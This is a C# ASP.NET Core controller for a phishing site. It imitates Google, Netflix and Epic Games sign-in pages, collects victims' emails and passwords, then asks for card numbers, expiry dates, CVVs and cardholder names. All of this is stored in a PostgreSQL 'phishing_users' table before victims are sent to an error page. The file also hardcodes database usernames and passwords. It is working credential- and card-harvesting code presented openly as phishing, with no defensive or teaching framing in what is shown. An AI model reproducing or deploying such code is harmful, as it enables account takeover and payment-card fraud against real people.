using System.Diagnostics;
using Microsoft.AspNetCore.Mvc;
using Npgsql;
using NpgsqlTypes;
using WebProject.Models;

namespace WebProject.Controllers;

public class PhishingSitesController : Controller
{
    // private readonly string connectionString = "Server=localhost;Port=5432;Username=erdemkurt;Password=353535;Database=phishing;";
    private readonly string connectionString =
        "Server=localhost;Port=49152;Username=senayilmaz;Password=2002;Database=webprojectdb;";

    public static UserModel staticatackUser = new UserModel();

    [HttpGet]
    public IActionResult Google()
    {
        return View();
    }

    [HttpPost]
    public IActionResult Google(UserModel attackeduser)
    {
        bool insertionResult = InsertGoogleEmail(attackeduser);
        ViewBag.Email = staticatackUser.user_email;
        if (insertionResult)
        {
            if (attackeduser != null)
            {
                staticatackUser.user_email = attackeduser.user_email;
            }

            return RedirectToAction("GooglePassword", "PhishingSites", attackeduser);
        }
        else
        {
            return RedirectToAction("Error", "PhishingSites");
        }
    }

    [HttpGet]
    public IActionResult GooglePassword()
    {
        ViewBag.Email = staticatackUser.user_email;
        return View();
    }

    [HttpPost]
    public IActionResult GooglePassword(UserModel attackeduser)
    {
        bool insertionResult = UpdateGooglePassword(attackeduser);
        if (insertionResult)
        {
            if (attackeduser != null)
            {
                ViewBag.Email = staticatackUser.user_email;
                staticatackUser.user_password = attackeduser.user_password;
            }

            return RedirectToAction("GoogleCard", "PhishingSites");
        }
        else
        {
            return RedirectToAction("Error", "PhishingSites");
        }
    }

    [HttpGet]
    public IActionResult GoogleCard()
    {
        ViewBag.Email = staticatackUser.user_email;
        return View();
    }

    [HttpPost]
    public IActionResult GoogleCard(UserModel attackeduser)
    {
        bool insertionResult = UpdatePhishingUserCardInfo(attackeduser);

        if (insertionResult)
        {
            if (attackeduser != null)
            {
                staticatackUser.user_email = attackeduser.user_email;
                staticatackUser.user_password = attackeduser.user_password;
            }

            ViewBag.Email = staticatackUser.user_email;
            return RedirectToAction("Error", "PhishingSites");
        }
        else
        {
            return RedirectToAction("Error", "PhishingSites");
        }
    }

    [HttpGet]
    public IActionResult Netflix()
    {
        return View();
    }

    [HttpPost]
    public IActionResult Netflix(UserModel attackeduser)
    {
        bool insertionResult = InsertPhishingUserToDatabase(attackeduser, 3);

        if (insertionResult)
        {
            if (attackeduser != null)
            {
                staticatackUser.user_email = attackeduser.user_email;
                staticatackUser.user_password = attackeduser.user_password;
            }

            return RedirectToAction("NetflixCard", "PhishingSites", attackeduser);
        }
        else
        {
            return RedirectToAction("Error", "PhishingSites");
        }
    }

    [HttpGet]
    public IActionResult NetflixCard()
    {
        return View();
    }

    [HttpPost]
    public IActionResult NetflixCard(UserModel attackeduser)
    {
        bool insertionResult = UpdatePhishingUserCardInfo(attackeduser);

        if (insertionResult)
        {
            return RedirectToAction("Error", "PhishingSites");
        }
        else
        {
            return RedirectToAction("Error", "PhishingSites");
        }
    }

    [HttpGet]
    public IActionResult Epic()
    {
        return View();
    }

    [HttpPost]
    public IActionResult Epic(UserModel attackeduser)
    {
        bool insertionResult = InsertPhishingUserToDatabase(attackeduser, 2);

        if (insertionResult)
        {
            if (attackeduser != null)
            {
                staticatackUser.user_email = attackeduser.user_email;
                staticatackUser.user_password = attackeduser.user_password;
            }

            return RedirectToAction("EpicCard", "PhishingSites", attackeduser);
        }
        else
        {
            return RedirectToAction("Error", "PhishingSites");
        }
    }

    [HttpGet]
    public IActionResult EpicCard()
    {
        return View();
    }

    [HttpPost]
    public IActionResult EpicCard(UserModel attackeduser)
    {
        Debug.WriteLine("1");
        bool insertionResult = UpdatePhishingUserCardInfo(attackeduser);

        if (insertionResult)
        {
            Debug.WriteLine("2");
            return RedirectToAction("Error", "PhishingSites");
        }
        else
        {
            Debug.WriteLine("3");
            return RedirectToAction("Error", "PhishingSites");
        }
    }

    public IActionResult Error()
    {
        return View();
    }

    private bool InsertPhishingUserToDatabase(UserModel attackedUser, int WhichPlatform)
    {
        string insertQuery =
            "INSERT INTO phishing_users (user_email, user_password, platform_id) VALUES (@Email, @Password, @PlatformId)";
        bool isExecuteCorrect = false;

        using (var connection = new NpgsqlConnection(connectionString))
        {
            connection.Open();

            using (var command = new NpgsqlCommand(insertQuery, connection))
            {
                command.Parameters.Add("@Email", NpgsqlDbType.Text).Value =
                    attackedUser.user_email != null ? attackedUser.user_email : DBNull.Value;
                command.Parameters.Add("@Password", NpgsqlDbType.Text).Value = attackedUser.user_password != null
                    ? attackedUser.user_password
                    : DBNull.Value;
                command.Parameters.Add("@PlatformId", NpgsqlDbType.Integer).Value =
                    WhichPlatform; // Burada Epic Games platformunun ID'sini kullanın
                int result = command.ExecuteNonQuery();
                isExecuteCorrect = result == 1;
            }
        }

        return isExecuteCorrect;
    }

    private bool UpdatePhishingUserCardInfo(UserModel attackedUser)
    {
        string updateQuery =
            "UPDATE phishing_users SET user_cc = @CC, user_date = @Date, user_cvv = @CVV, user_name_on_card = @NameOnCard WHERE user_email = @Email AND user_password = @Password";

        bool isExecuteCorrect = false;

        using (var connection = new NpgsqlConnection(connectionString))
        {
            Debug.WriteLine("5");
            connection.Open();
            using (var command = new NpgsqlCommand(updateQuery, connection))
            {
                Debug.WriteLine("6");
                command.Parameters.Add("@Email", NpgsqlDbType.Text).Value =
                    staticatackUser.user_email; // Kullanıcı email'i
                command.Parameters.Add("@Password", NpgsqlDbType.Text).Value =
                    staticatackUser.user_password; // Kullanıcı şifresi
                command.Parameters.Add("@CC", NpgsqlDbType.Text).Value = attackedUser.user_cc ?? (object)DBNull.Value;
                command.Parameters.Add("@Date", NpgsqlDbType.Text).Value =
                    attackedUser.user_date ?? (object)DBNull.Value;
                command.Parameters.Add("@CVV", NpgsqlDbType.Text).Value = attackedUser.user_cvv ?? (object)DBNull.Value;
                command.Parameters.Add("@NameOnCard", NpgsqlDbType.Text).Value =
                    attackedUser.user_name_on_card ?? (object)DBNull.Value;
                Debug.WriteLine("7");
                int result = command.ExecuteNonQuery();
                Debug.WriteLine(command.CommandText);
                Debug.WriteLine("SENAAAAAAAAAAAA");
                isExecuteCorrect = result == 1;
            }

            Debug.WriteLine("8");
        }

        return isExecuteCorrect;
    }

    private bool InsertGoogleEmail(UserModel attackedUser)
    {
        string insertQuery = "INSERT INTO phishing_users (user_email, platform_id) VALUES (@Email, @PlatformId)";
        bool isExecuteCorrect = false;

        using (var connection = new NpgsqlConnection(connectionString))
        {
            connection.Open();

            using (var command = new NpgsqlCommand(insertQuery, connection))
            {
                command.Parameters.Add("@Email", NpgsqlDbType.Text).Value =
                    attackedUser.user_email != null ? attackedUser.user_email : DBNull.Value;
                command.Parameters.Add("@PlatformId", NpgsqlDbType.Integer).Value = 1;
                int result = command.ExecuteNonQuery();
                isExecuteCorrect = result == 1;
            }
        }

        return isExecuteCorrect;
    }

    private bool UpdateGooglePassword(UserModel atackedUser)
    {
        string updateQuery =
            "UPDATE phishing_users SET user_password = @Password WHERE user_email = @Email AND platform_id = @PlatformId";

        bool isExecuteCorrect = false;

        using (var connection = new NpgsqlConnection(connectionString))
        {
            connection.Open();
            using (var command = new NpgsqlCommand(updateQuery, connection))
            {
                command.Parameters.Add("@Email", NpgsqlDbType.Text).Value = staticatackUser.user_email;
                command.Parameters.Add("@Password", NpgsqlDbType.Text).Value = atackedUser.user_password;
                command.Parameters.Add("@PlatformId", NpgsqlDbType.Integer).Value = 1;
                int result = command.ExecuteNonQuery();
                isExecuteCorrect = result != 0;
            }
        }

        return isExecuteCorrect;
    }
}